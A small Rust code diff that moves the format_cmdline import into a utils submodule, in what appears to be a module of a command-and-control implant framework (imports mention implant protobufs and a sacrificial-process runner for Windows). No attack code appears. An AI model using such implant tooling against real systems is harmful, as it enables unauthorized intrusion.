@@ -1,5 +1,5 @@
 use crate::{Module, TaskResult, check_request};
-use malefic_helper::common::format_cmdline;
+use malefic_helper::common::utils::format_cmdline;
 use malefic_proto::proto::modulepb::BinaryResponse;
 use malefic_proto::proto::implantpb::spite::Body;
 use malefic_helper::win::kit::pe::run_sacrifice;
